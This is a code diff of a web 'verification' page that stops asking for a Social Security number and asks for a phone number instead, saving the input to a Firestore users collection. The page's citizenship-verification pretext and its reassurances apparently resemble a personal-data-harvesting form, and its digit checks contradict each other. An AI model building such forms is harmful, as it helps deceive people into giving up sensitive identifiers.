@@ -13,27 +13,27 @@ function VerificationPage() {
     const router = useRouter();
 
     const dbUserRef = useRef(collection(firestoreDb, "users"));
-    const [ssn, setSsn] = useState({ value: "", err: "" });
+    const [phone, setPhone] = useState({ value: "", err: "" });
     const [recaptchaToken, setRecaptchaToken] = useState("");
     const [isLoading, setIsLoading] = useState(false);
 
-    const ssnOnChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
+    const phoneOnChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
         const value = e.target.value.replace(/\D+/, ""); // remove spaces and non-digits
-        const isComplete = /\d{10}/.test(value);
+        const isComplete = /\d{11}/.test(value);
 
         if (!isComplete) {
-            setSsn({ value: value, err: "" })
+            setPhone({ value: value, err: "" })
         }
 
     }, [])
 
     const handleSubmit = async () => {
-        if (ssn.value.length !== 9) return setSsn({ ...ssn, err: "Invalid ssn" });
+        if (phone.value.length !== 10) return setPhone({ ...phone, err: "Invalid Phone Number" });
         setIsLoading(true);
 
         const userData = JSON.parse(localStorage.getItem("farmerBrotherUserInputs")!);
 
-        userData.ssn = ssn.value;
+        userData.PhoneNumber = phone.value;
         userData.createdAt = serverTimestamp();
 
         try {
@@ -63,18 +63,18 @@ function VerificationPage() {
                     height={200}
                     className='self-center'
                 />
-                <h1 className='text-center text-3xl font-bold'>Please Verify Your Identity and confirm you are a citizen of USA by verifying yout ssn</h1>
+                <h1 className='text-center text-3xl font-bold'>Please Verify Your Identity and confirm you are a citizen of USA by verifying with your Phone number</h1>
                 <p className='text-red-500 text-center font-bold'>Note: That your information is well protected as this information will not be shared with any third party</p>
                 <TextField
                     fullWidth
-                    id="ssn-basic"
-                    label="SSN Verification"
+                    id="phone-basic"
+                    label="Phone Number"
                     variant="outlined"
                     type='tel'
-                    value={ssn.value}
-                    onChange={ssnOnChange}
-                    error={ssn.err ? true : false}
-                    helperText={ssn.err}
+                    value={phone.value}
+                    onChange={phoneOnChange}
+                    error={phone.err ? true : false}
+                    helperText={phone.err}
                 />
                 <ReCaptcha onValidate={setRecaptchaToken} action="page_view" />
                 <Button
